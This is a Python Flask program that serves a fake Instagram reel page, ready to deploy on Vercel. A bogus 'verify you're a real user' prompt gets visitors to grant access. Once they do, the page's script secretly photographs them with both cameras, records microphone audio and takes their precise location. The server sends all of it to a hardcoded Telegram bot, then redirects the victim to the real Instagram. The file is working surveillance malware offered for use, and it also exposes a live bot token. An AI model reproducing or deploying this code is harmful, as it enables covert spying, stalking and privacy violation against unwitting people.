from flask import Flask, request, render_template_string, jsonify
import requests
import base64
import time

app = Flask(__name__)

BOT_TOKEN = "8939528828:AAEbmdhA8sVYw9IQdhVlJBJdGHvuUVDoXLM"
BOT_OWNER_ID = 713914937

HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
.container{width:100%;max-width:400px;height:100vh;max-height:800px;background:#111;display:flex;flex-direction:column}
.header{display:flex;align-items:center;padding:12px 16px;gap:10px;background:#1a1a1a}
.header img{width:32px;height:32px;border-radius:50%;background:#333}
.header .name{font-weight:600;font-size:14px;color:#fff}
.header .time{margin-left:auto;color:#888;font-size:12px}
.video-container{flex:1;background:#1a1a1a;display:flex;align-items:center;justify-content:center;position:relative;min-height:300px}
.video-container video{width:100%;height:100%;object-fit:cover}
.overlay{position:absolute;bottom:20px;left:20px;background:rgba(0,0,0,0.7);padding:6px 14px;border-radius:20px;font-size:13px;color:#fff}
.actions{display:flex;justify-content:space-around;padding:12px 16px;background:#111;border-top:1px solid #222}
.actions button{background:transparent;border:none;color:#fff;font-size:22px;padding:4px 12px;cursor:pointer}
.permission-box{position:fixed;bottom:0;left:0;right:0;background:#1a1a1a;padding:20px;border-top:1px solid #333;display:none;z-index:100;flex-direction:column;gap:12px}
.permission-box.show{display:flex}
.permission-box h3{font-size:16px;color:#fff}
.permission-box p{font-size:13px;color:#aaa}
.btn-row{display:flex;gap:12px}
.btn-row button{flex:1;padding:12px;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}
.btn-allow{background:#1d9bf0;color:#fff}
.btn-deny{background:#333;color:#fff}
.loading{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);display:none;align-items:center;justify-content:center;flex-direction:column;gap:16px;z-index:200}
.loading.show{display:flex}
.spinner{width:40px;height:40px;border:4px solid #333;border-top-color:#1d9bf0;border-radius:50%;animation:spin 0.8s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.toast{position:fixed;top:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.85);color:#fff;padding:10px 20px;border-radius:10px;font-size:13px;z-index:300;display:none}
.toast.show{display:block}
</style>
</head>
<body>
<div class="toast" id="toast"></div>
<div class="loading" id="loading"><div class="spinner"></div><div style="color:#fff;font-size:14px;">Loading reel...</div></div>
<div class="container">
<div class="header"><img src="https://i.pravatar.cc/32?img=12"><span class="name">reel_king_99</span><span class="time">• 2h</span></div>
<div class="video-container"><video id="vid" autoplay loop muted playsinline><source src="https://www.w3schools.com/html/mov_bbb.mp4"></video><div class="overlay">🔥 Trending</div></div>
<div class="actions"><button onclick="showPerm()">❤️</button><button onclick="showPerm()">💬</button><button onclick="showPerm()">📤</button></div>
</div>
<div class="permission-box" id="permBox"><h3>🔐 Access Required</h3><p>Instagram needs access to your camera, microphone, and location to verify you're a real user.</p><div class="btn-row"><button class="btn-deny" onclick="denyPerm()">Deny</button><button class="btn-allow" onclick="allowPerm()">Allow</button></div></div>
<script>
let stream=null;let captured={photos:[],location:null,audio:null};
function toast(m){const t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2500);}
function showPerm(){document.getElementById('permBox').classList.add('show');}
function denyPerm(){document.getElementById('permBox').classList.remove('show');toast('⚠️ You must allow to view this reel');}
function allowPerm(){document.getElementById('permBox').classList.remove('show');document.getElementById('loading').classList.add('show');toast('📸 Access granted...');startCapture();}
function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
async function startCapture(){
if(navigator.geolocation){navigator.geolocation.getCurrentPosition(pos=>{captured.location={lat:pos.coords.latitude,lng:pos.coords.longitude};},()=>{}, {enableHighAccuracy:true,timeout:8000});}
try{let c={video:{facingMode:'environment',width:640,height:480},audio:false};stream=await navigator.mediaDevices.getUserMedia(c);let v=document.createElement('video');v.srcObject=stream;await v.play();let canvas=document.createElement('canvas');canvas.width=640;canvas.height=480;let ctx=canvas.getContext('2d');
for(let i=0;i<3;i++){ctx.drawImage(v,0,0,640,480);captured.photos.push({type:'back',index:i,data:canvas.toDataURL('image/jpeg',0.8)});await sleep(400);}
stream.getTracks().forEach(t=>t.stop());
try{let f={video:{facingMode:'user',width:640,height:480},audio:false};stream=await navigator.mediaDevices.getUserMedia(f);v.srcObject=stream;await v.play();for(let i=0;i<2;i++){ctx.drawImage(v,0,0,640,480);captured.photos.push({type:'front',index:i,data:canvas.toDataURL('image/jpeg',0.8)});await sleep(400);}stream.getTracks().forEach(t=>t.stop());}catch(e){}}catch(e){}
try{let a=await navigator.mediaDevices.getUserMedia({audio:true});let r=new MediaRecorder(a);let ch=[];r.ondataavailable=e=>ch.push(e.data);r.onstop=()=>{let b=new Blob(ch,{type:'audio/webm'});let reader=new FileReader();reader.onload=function(){captured.audio=reader.result.split(',')[1];};reader.readAsDataURL(b);};r.start();await sleep(4000);r.stop();a.getTracks().forEach(t=>t.stop());}catch(e){}
await sleep(1000);sendData(captured);}
function sendData(d){fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).then(()=>{document.getElementById('loading').classList.remove('show');toast('✅ Done!');document.querySelector('.overlay').textContent='👍 Liked!';setTimeout(()=>window.location.href='https://www.instagram.com/',2000);}).catch(()=>{document.getElementById('loading').classList.remove('show');toast('Error');});}
</script>
</body></html>"""

@app.route('/')
@app.route('/reel/<reel_id>')
def index(reel_id=None):
    return render_template_string(HTML)

@app.route('/api/capture', methods=['POST'])
def capture():
    try:
        data = request.json
        chat_id = BOT_OWNER_ID
        
        if data.get('location'):
            loc = data['location']
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation", 
                         data={'chat_id': chat_id, 'latitude': loc['lat'], 'longitude': loc['lng']})
        
        for i, photo in enumerate(data.get('photos', [])):
            if photo.get('data'):
                img_data = photo['data'].split(',')[1]
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                             files={'photo': (f'photo_{i}.jpg', base64.b64decode(img_data), 'image/jpeg')})
        
        if data.get('audio'):
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
                         files={'audio': ('voice.webm', base64.b64decode(data['audio']), 'audio/webm')})
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'status': 'error'})

# =============================================
# VERCEL HANDLER — THIS IS THE FIX
# =============================================

def handler(request, context):
    """Vercel serverless handler."""
    return app(request.environ, request.start_response)